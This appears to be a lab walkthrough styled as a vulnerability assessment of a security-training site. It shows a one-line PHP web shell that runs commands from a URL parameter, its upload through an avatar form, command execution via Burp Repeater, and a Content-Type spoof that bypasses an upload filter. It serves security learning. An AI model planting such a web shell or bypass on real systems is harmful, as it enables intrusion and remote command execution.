# Web Exploitation with PHP

## Scenario: CyberVet Technologies' Vulnerability Assessment for Web Security Academy

## Project Name: Web Security Academy Vulnerability Assessment

## Client: Web Security Academy

## Service Provider: CyberVet Technologies

## Objective: Identify and address web vulnerabilities to ensure the website's safety and security for end users.

## Project Context
Web Security Academy is a prominent organization that provides training and resources on web security best practices. As part of their commitment to delivering a secure learning environment, they have engaged CyberVet Technologies to perform a comprehensive vulnerability assessment on their website. The goal is to identify any security weaknesses that could potentially compromise the integrity of the website or the safety of its users.

## Findings in Steps 

1. The first step we are going to do is create a php file in Linux.
filename: webshell.php
<?php echo system($_GET['command']); ?>

2. Second step is to log into Web Security Academy with the appropriate log in credentials. Once we are logged in head to 
my account and upload an Avatar file which would be the PHP file we created. 

![image](https://github.com/user-attachments/assets/5cb825d1-0448-4d5c-a90f-766f17723b98)


3. The First vulnerability I see is that we can upload any file. That means I select any file I want so in this case we are going to upload webshell.php.
   
![image](https://github.com/user-attachments/assets/9158a8f3-74b0-4d17-9ecb-982b92b93744)



4. Once the file is uploaded go ahead and open Burpe Suite. Once that is open head to your web browser and copy the url of where you uploaded the avatar file. Hover over the image to find the file path --> right-click and select inspect. As you can tell with the image below the file path is /files/avatars/webshell.php

![image](https://github.com/user-attachments/assets/1abec7b2-2c76-4b4c-aa1b-9a7a739d7122)


5. Once the url has been copied go back to Burpesuite and select on the target tab --> open browser --> paste url --> log in --> tab over to Dashboard in burpesuite --> select New live task --> Make sure to select Repeater --> Hit OK

![image](https://github.com/user-attachments/assets/a8180787-219d-4088-9270-d23f53b36d82)


6. Tab over to Proxy --> HTTP History --> look for the file path /file/avatars/webshell.php -->  

![image](https://github.com/user-attachments/assets/c5fec6e6-47a3-43ca-9f07-c72fcefa79c8)


7. Once the file path is found copy all--> tab over to Repeater then past

![image](https://github.com/user-attachments/assets/8553c82e-d886-464e-b919-3d4979702fdc)
![image](https://github.com/user-attachments/assets/67f8f80a-3a62-4f1a-931b-4505ae8a0641)

8. You hit send to make sure everything still works. You will get a HTTP 200 response

![image](https://github.com/user-attachments/assets/9dc9c44e-4ee8-42c4-a827-62ef24eadb18)

9. From here we can go ahead and insert the variable ?command=ls hit send and you'll notice now that in Response you have two webshell.php

![image](https://github.com/user-attachments/assets/d64b79b4-83a6-449b-bc8b-93d10d87c3b6)

10. Hit send and you'll notice now that in Response you have two webshell.php

![image](https://github.com/user-attachments/assets/2c78d553-b59d-4323-a2ca-7acddd03f837)

## Vulnerability Number 2 I found

During my scan I realized that some files I tried to upload were not permitted by the system. 

I went back to Burpesuite and looked for the Request for /my-account/avatar. Once I found the Request I scrolled down to where Content-Type  was --> Right-Clicked-->Send to Repeater--> Changed it from application/x-php to image/png. 

![image](https://github.com/user-attachments/assets/b22301a6-1a35-41f3-8b58-9eee4fe504e4)

Once the change was made I hit send to make sure it worked and I got a HTTP response code back. 

![image](https://github.com/user-attachments/assets/f71d893d-ca4c-4f9c-83db-5847e6ed38f9)

What I did was essentailly lied and changed the request type to an image versus a php file. 

## As you can see we have successfully achieved Remote Code Execution
